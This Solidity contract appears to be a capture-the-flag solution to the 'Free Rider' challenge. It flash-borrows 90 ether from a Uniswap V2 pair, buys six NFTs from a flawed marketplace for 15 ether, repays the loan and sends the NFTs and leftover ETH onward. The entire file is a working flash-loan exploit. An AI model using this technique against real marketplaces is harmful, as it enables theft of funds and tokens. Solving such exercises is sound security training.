// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {WETH} from "solmate/tokens/WETH.sol";

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderRecovery is Ownable, IERC721Receiver, ReentrancyGuard {
    IUniswapV2Pair private immutable _pair;
    IMarketplace private immutable _marketplace;
    IERC721 private immutable _nft;
    WETH private immutable _weth;
    address private immutable _recovery;

    constructor(address pair, address marketplace, address nft, address weth, address recovery) Ownable(msg.sender) {
        _pair = IUniswapV2Pair(pair);
        _marketplace = IMarketplace(marketplace);
        _nft = IERC721(nft);
        _weth = WETH(payable(weth));
        _recovery = recovery;
    }

    function recover() external onlyOwner {
        uint256 amount0Out = _pair.token0() == address(_weth) ? 90 ether : 0;
        uint256 amount1Out = _pair.token1() == address(_weth) ? 90 ether : 0;

        _pair.swap(amount0Out, amount1Out, address(this), abi.encode(address(this)));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == address(_pair));
        require(sender == address(this), "invalid sender");

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        _weth.withdraw(borrowedAmount);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        _marketplace.buyMany{value: 15 ether}(tokenIds);

        _weth.deposit{value: address(this).balance}();
        uint256 fee = (borrowedAmount * 3) / 997 + 1;
        _weth.transfer(address(_pair), borrowedAmount + fee);

        for (uint256 i; i < 6;) {
            _nft.safeTransferFrom(address(this), _recovery, i, abi.encode(address(this)));
            unchecked {
                ++i;
            }
        }

        (bool success, bytes memory data) = payable(owner()).call{value: address(this).balance}("");
        require(success, "eth transfer failed");
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory)
        external
        override
        nonReentrant
        returns (bytes4)
    {
        require(msg.sender == address(_nft), "invalid sender");

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
